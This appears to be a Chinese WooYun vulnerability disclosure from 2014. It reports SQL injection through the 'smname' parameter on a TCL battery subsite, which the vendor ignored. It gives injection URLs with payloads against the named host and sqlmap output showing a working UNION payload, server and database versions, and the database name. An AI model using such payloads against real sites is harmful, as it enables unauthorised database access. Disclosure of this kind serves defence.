wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2014-06-10：	细节已通知厂商并且等待厂商处理中									2014-06-15：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： TCL某分站SQL注入 详细说明：  注入地址：http://battery.tcl.com/read_products.php?smname=MP3/MP4%CF%B5%C1%D0http://battery.tcl.com/read_products.php?smname=%27%2b+(select+convert(int%2cCHAR(95)%2bCHAR(33)%2bCHAR(64)%2bCHAR(50)%2bCHAR(100)%2bCHAR(105)%2bCHAR(108)%2bCHAR(101)%2bCHAR(109)%2bCHAR(109)%2bCHAR(97))+FROM+syscolumns)+%2b%27

[23:44:07] [INFO] GET parameter 'smname' is 'MySQL UNION query (random number) - 1 to 10 columns' injectableGET parameter 'smname' is vulnerable. Do you want to keep testing the others (if any)? [y/N]sqlmap identified the following injection points with a total of 565 HTTP(s) requests:---Place: GETParameter: smname    Type: UNION query    Title: MySQL UNION query (random number) - 8 columns    Payload: smname=-4962' UNION ALL SELECT 3715,CONCAT(0x7163646e71,0x7350576e504c754d5071,0x716c677471),3715,3715,3715,3715,3715,3715#---[23:44:11] [INFO] testing MySQL[23:44:11] [INFO] confirming MySQL[23:44:12] [INFO] the back-end DBMS is MySQLweb server operating system: Windows 2003 or XPweb application technology: Microsoft IIS 6.0, PHP 4.3.4back-end DBMS: MySQL < 5.0.0[23:44:12] [WARNING] information_schema not available, back-end DBMS is MySQL < 5. database names will be fetched from 'mysql' database[23:44:12] [INFO] falling back to current database[23:44:12] [INFO] fetching current databaseavailable databases [1]:[*] battery   漏洞证明：  如上   修复方案：  过滤smname输入参数   版权声明：转载请注明来源 smartICSL@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-06-15 12:57 厂商回复：  最新状态： 暂无
